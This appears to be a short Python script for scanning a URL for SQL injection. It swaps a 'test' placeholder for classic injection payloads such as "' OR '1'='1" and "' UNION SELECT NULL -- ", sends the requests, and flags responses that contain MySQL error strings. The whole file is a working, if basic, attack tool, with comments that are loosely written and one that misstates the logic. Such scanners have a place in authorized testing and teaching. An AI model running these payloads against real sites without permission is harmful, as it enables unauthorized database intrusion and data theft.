import requests

# Payloads given from the internet.
PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' -- ",
    "' UNION SELECT NULL -- ",
    "' OR 1=1#",
]

#We are looking for the server to gve back some type of information.
ERROR_PATTERNS = [
    "You have an error in your SQL syntax",
    "Warning",
]

#The scan function can be called to do the things we need done. It will replace the URL in question with  our new
#url and append the payload. If no error are found we wll prn them.
def scan(url: str):
    print(f"[INFO] Starting SQLi scan on: {url}")
    for payload in PAYLOADS:
        # Replace 'test' placeholder with payload
        test_url = url.replace("test", payload)

        try:
            response = requests.get(test_url, timeout=5)

            #parse through all errors give, if any are given at all.
            for error in ERROR_PATTERNS:
                if error.lower() in response.text.lower():
                    print(f"[VULNERABLE] Possible SQLi detected with payload: {payload}")
                    print(f"[ERROR PATTERN] Found: {error}")
                    break
            else:
                print(f"[OK] No SQL errors for payload: {payload}")

        except requests.exceptions.RequestException as e:
            print(f"[ERROR] Request failed for payload {payload}: {e}")
    #not needed but tells us that there is nothing left to do.
    print("[INFO] SQLi scan complete.")
